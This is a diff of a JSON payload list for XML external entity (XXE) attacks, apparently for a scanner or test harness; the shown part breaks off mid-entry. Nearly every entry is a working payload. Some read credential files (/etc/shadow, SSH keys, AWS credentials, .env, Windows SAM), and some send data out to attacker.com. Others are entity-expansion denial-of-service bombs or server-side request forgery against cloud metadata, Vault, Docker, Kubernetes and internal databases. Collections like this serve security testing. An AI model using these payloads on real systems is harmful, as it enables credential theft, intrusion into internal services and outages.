@@ -1,12 +1,1262 @@
-{
-    "name": "XXE File Disclosure",
-    "description": "Inject XXE to read local files",
-    "method": "POST",
-    "endpoint": "/xml",
-    "headers": {
-        "Content-Type": "application/xml"
+[
+    {
+        "name": "XXE File Disclosure - /etc/passwd",
+        "description": "Read /etc/passwd file using external entity",
+        "method": "POST",
+        "endpoint": "/xml",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>"
+        }
     },
-    "parameters": {
-        "xml": "<?xml version=\"1.0\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>"
+    {
+        "name": "XXE File Disclosure - /etc/shadow",
+        "description": "Attempt to read shadow password file",
+        "method": "POST",
+        "endpoint": "/upload",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/shadow\"> ]><user>&xxe;</user>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Windows hosts",
+        "description": "Read Windows hosts file",
+        "method": "POST",
+        "endpoint": "/api/xml",
+        "headers": {
+            "Content-Type": "text/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> ]><config>&xxe;</config>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /proc/self/environ",
+        "description": "Read environment variables",
+        "method": "POST",
+        "endpoint": "/process",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///proc/self/environ\"> ]><info>&xxe;</info>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - SSH keys",
+        "description": "Read SSH private key",
+        "method": "POST",
+        "endpoint": "/ssh",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\"> ]><key>&xxe;</key>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - AWS credentials",
+        "description": "Read AWS credentials file",
+        "method": "POST",
+        "endpoint": "/cloud",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///home/user/.aws/credentials\"> ]><credentials>&xxe;</credentials>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Database config",
+        "description": "Read database configuration",
+        "method": "POST",
+        "endpoint": "/config",
+        "headers": {
+            "Content-Type": "text/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///var/www/html/config/database.php\"> ]><db>&xxe;</db>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Apache config",
+        "description": "Read Apache configuration",
+        "method": "POST",
+        "endpoint": "/server",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///etc/apache2/apache2.conf\"> ]><server>&xxe;</server>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Nginx config",
+        "description": "Read Nginx configuration",
+        "method": "POST",
+        "endpoint": "/nginx",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///etc/nginx/nginx.conf\"> ]><config>&xxe;</config>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /etc/hosts",
+        "description": "Read hosts file",
+        "method": "POST",
+        "endpoint": "/network",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///etc/hosts\"> ]><network>&xxe;</network>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /etc/group",
+        "description": "Read group file",
+        "method": "POST",
+        "endpoint": "/groups",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///etc/group\"> ]><groups>&xxe;</groups>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /proc/cpuinfo",
+        "description": "Read CPU information",
+        "method": "POST",
+        "endpoint": "/system",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///proc/cpuinfo\"> ]><system>&xxe;</system>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /proc/version",
+        "description": "Read kernel version",
+        "method": "POST",
+        "endpoint": "/version",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///proc/version\"> ]><version>&xxe;</version>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - /proc/meminfo",
+        "description": "Read memory information",
+        "method": "POST",
+        "endpoint": "/memory",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///proc/meminfo\"> ]><memory>&xxe;</memory>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Windows SAM",
+        "description": "Attempt to read Windows SAM file",
+        "method": "POST",
+        "endpoint": "/windows",
+        "headers": {
+            "Content-Type": "text/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/config/SAM\"> ]><sam>&xxe;</sam>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Web config",
+        "description": "Read web application config",
+        "method": "POST",
+        "endpoint": "/webconfig",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///var/www/html/config.php\"> ]><config>&xxe;</config>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Log files",
+        "description": "Read application logs",
+        "method": "POST",
+        "endpoint": "/logs",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///var/log/apache2/access.log\"> ]><logs>&xxe;</logs>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - PHP session",
+        "description": "Read PHP session files",
+        "method": "POST",
+        "endpoint": "/session",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///tmp/sess_12345\"> ]><session>&xxe;</session>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - .env file",
+        "description": "Read environment configuration",
+        "method": "POST",
+        "endpoint": "/env",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///var/www/html/.env\"> ]><environment>&xxe;</environment>"
+        }
+    },
+    {
+        "name": "XXE File Disclosure - Git config",
+        "description": "Read Git configuration",
+        "method": "POST",
+        "endpoint": "/git",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///home/user/.gitconfig\"> ]><git>&xxe;</git>"
+        }
+    },
+    {
+        "name": "XXE External Entity - HTTP",
+        "description": "External entity via HTTP",
+        "method": "POST",
+        "endpoint": "/external",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://attacker.com/data\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE External Entity - FTP",
+        "description": "External entity via FTP",
+        "method": "POST",
+        "endpoint": "/ftp",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"ftp://attacker.com/file.txt\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE External Entity - HTTPS",
+        "description": "External entity via HTTPS",
+        "method": "POST",
+        "endpoint": "/secure",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"https://attacker.com/data.xml\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE Parameter Entity",
+        "description": "Parameter entity expansion",
+        "method": "POST",
+        "endpoint": "/param",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe; ]><data>test</data>"
+        }
+    },
+    {
+        "name": "XXE Parameter Entity with External DTD",
+        "description": "Parameter entity with external DTD",
+        "method": "POST",
+        "endpoint": "/external-dtd",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY % xxe SYSTEM \"http://attacker.com/malicious.dtd\"> %xxe; ]><data>test</data>"
+        }
+    },
+    {
+        "name": "XXE Blind - Out of Band",
+        "description": "Blind XXE with DNS lookup",
+        "method": "POST",
+        "endpoint": "/blind",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://attacker.com/?data=exfil\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE Blind - Error Based",
+        "description": "Blind XXE with error messages",
+        "method": "POST",
+        "endpoint": "/error",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"file:///nonexistent\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE DoS - Billion Laughs",
+        "description": "Billion Laughs attack",
+        "method": "POST",
+        "endpoint": "/dos",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\"><!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\"> ]><data>&lol2;</data>"
+        }
+    },
+    {
+        "name": "XXE DoS - Quadratic Blowup",
+        "description": "Quadratic entity expansion",
+        "method": "POST",
+        "endpoint": "/quadratic",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY a \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\"> ]><data>&c;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Internal Network",
+        "description": "SSRF to internal network",
+        "method": "POST",
+        "endpoint": "/ssrf",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://192.168.1.1/admin\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - AWS Metadata",
+        "description": "SSRF to AWS metadata service",
+        "method": "POST",
+        "endpoint": "/aws",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Google Metadata",
+        "description": "SSRF to GCP metadata service",
+        "method": "POST",
+        "endpoint": "/gcp",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Azure Metadata",
+        "description": "SSRF to Azure metadata service",
+        "method": "POST",
+        "endpoint": "/azure",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Localhost",
+        "description": "SSRF to localhost services",
+        "method": "POST",
+        "endpoint": "/localhost",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Redis",
+        "description": "SSRF to Redis service",
+        "method": "POST",
+        "endpoint": "/redis",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"gopher://127.0.0.1:6379/_INFO\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - MySQL",
+        "description": "SSRF to MySQL service",
+        "method": "POST",
+        "endpoint": "/mysql",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:3306\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Memcached",
+        "description": "SSRF to Memcached service",
+        "method": "POST",
+        "endpoint": "/memcached",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:11211\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Elasticsearch",
+        "description": "SSRF to Elasticsearch service",
+        "method": "POST",
+        "endpoint": "/elastic",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9200/_cat/indices\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - MongoDB",
+        "description": "SSRF to MongoDB service",
+        "method": "POST",
+        "endpoint": "/mongo",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:27017\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - SMTP",
+        "description": "SSRF to SMTP service",
+        "method": "POST",
+        "endpoint": "/smtp",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"smtp://127.0.0.1:25\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - FTP",
+        "description": "SSRF to FTP service",
+        "method": "POST",
+        "endpoint": "/ftpsrf",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"ftp://127.0.0.1:21\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - SSH",
+        "description": "SSRF to SSH service",
+        "method": "POST",
+        "endpoint": "/ssh-srf",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"ssh://127.0.0.1:22\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Telnet",
+        "description": "SSRF to Telnet service",
+        "method": "POST",
+        "endpoint": "/telnet",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"telnet://127.0.0.1:23\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - DNS",
+        "description": "DNS lookup via SSRF",
+        "method": "POST",
+        "endpoint": "/dns",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://internal.service.local\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Internal API",
+        "description": "SSRF to internal API endpoints",
+        "method": "POST",
+        "endpoint": "/internal-api",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://internal-api:8080/v1/secrets\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Kubernetes API",
+        "description": "SSRF to Kubernetes API",
+        "method": "POST",
+        "endpoint": "/k8s",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"https://kubernetes.default.svc.cluster.local/api/v1/namespaces/default/pods\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Docker Socket",
+        "description": "SSRF to Docker socket",
+        "method": "POST",
+        "endpoint": "/docker",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://unix:///var/run/docker.sock\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Consul",
+        "description": "SSRF to Consul service discovery",
+        "method": "POST",
+        "endpoint": "/consul",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8500/v1/catalog/services\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - etcd",
+        "description": "SSRF to etcd key-value store",
+        "method": "POST",
+        "endpoint": "/etcd",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:2379/v2/keys/\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Vault",
+        "description": "SSRF to HashiCorp Vault",
+        "method": "POST",
+        "endpoint": "/vault",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8200/v1/secret/data\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Jenkins",
+        "description": "SSRF to Jenkins API",
+        "method": "POST",
+        "endpoint": "/jenkins",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/jenkins/api/json\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - GitLab",
+        "description": "SSRF to GitLab API",
+        "method": "POST",
+        "endpoint": "/gitlab",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/api/v4/projects\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Prometheus",
+        "description": "SSRF to Prometheus metrics",
+        "method": "POST",
+        "endpoint": "/prometheus",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9090/api/v1/query?query=up\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Grafana",
+        "description": "SSRF to Grafana API",
+        "method": "POST",
+        "endpoint": "/grafana",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:3000/api/dashboards/home\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - RabbitMQ",
+        "description": "SSRF to RabbitMQ management",
+        "method": "POST",
+        "endpoint": "/rabbitmq",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:15672/api/overview\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Zookeeper",
+        "description": "SSRF to Zookeeper",
+        "method": "POST",
+        "endpoint": "/zookeeper",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:2181\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Cassandra",
+        "description": "SSRF to Cassandra",
+        "method": "POST",
+        "endpoint": "/cassandra",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9042\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - CouchDB",
+        "description": "SSRF to CouchDB",
+        "method": "POST",
+        "endpoint": "/couchdb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:5984/_all_dbs\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - InfluxDB",
+        "description": "SSRF to InfluxDB",
+        "method": "POST",
+        "endpoint": "/influxdb",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8086/query?q=SHOW+DATABASES\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Postgres",
+        "description": "SSRF to Postgres",
+        "method": "POST",
+        "endpoint": "/postgres",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:5432\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Oracle DB",
+        "description": "SSRF to Oracle Database",
+        "method": "POST",
+        "endpoint": "/oracle",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:1521\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - SQL Server",
+        "description": "SSRF to SQL Server",
+        "method": "POST",
+        "endpoint": "/mssql",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:1433\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Redis UNPROTECTED",
+        "description": "SSRF to unprotected Redis",
+        "method": "POST",
+        "endpoint": "/redis-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:6379\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Memcached UNPROTECTED",
+        "description": "SSRF to unprotected Memcached",
+        "method": "POST",
+        "endpoint": "/memcached-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:11211\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - etcd UNPROTECTED",
+        "description": "SSRF to unprotected etcd",
+        "method": "POST",
+        "endpoint": "/etcd-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:2379\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - MongoDB UNPROTECTED",
+        "description": "SSRF to unprotected MongoDB",
+        "method": "POST",
+        "endpoint": "/mongo-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:27017\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - CouchDB UNPROTECTED",
+        "description": "SSRF to unprotected CouchDB",
+        "method": "POST",
+        "endpoint": "/couchdb-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:5984\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Elasticsearch UNPROTECTED",
+        "description": "SSRF to unprotected Elasticsearch",
+        "method": "POST",
+        "endpoint": "/elastic-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9200\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Kafka",
+        "description": "SSRF to Kafka",
+        "method": "POST",
+        "endpoint": "/kafka",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:9092\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - NATS",
+        "description": "SSRF to NATS messaging",
+        "method": "POST",
+        "endpoint": "/nats",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:4222\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - RabbitMQ UNPROTECTED",
+        "description": "SSRF to unprotected RabbitMQ",
+        "method": "POST",
+        "endpoint": "/rabbitmq-unprotected",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:5672\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - ActiveMQ",
+        "description": "SSRF to ActiveMQ",
+        "method": "POST",
+        "endpoint": "/activemq",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:61616\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Mosquitto",
+        "description": "SSRF to Mosquitto MQTT",
+        "method": "POST",
+        "endpoint": "/mosquitto",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
+            "xml": "<?xml version=\"1.0\"?><!DOCTYPE data [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:1883\"> ]><data>&xxe;</data>"
+        }
+    },
+    {
+        "name": "XXE SSRF - Redis Cluster",
+        "description": "SSRF to Redis cluster",
+        "method": "POST",
+        "endpoint": "/redis-cluster",
+        "headers": {
+            "Content-Type": "application/xml"
+        },
+        "parameters": {
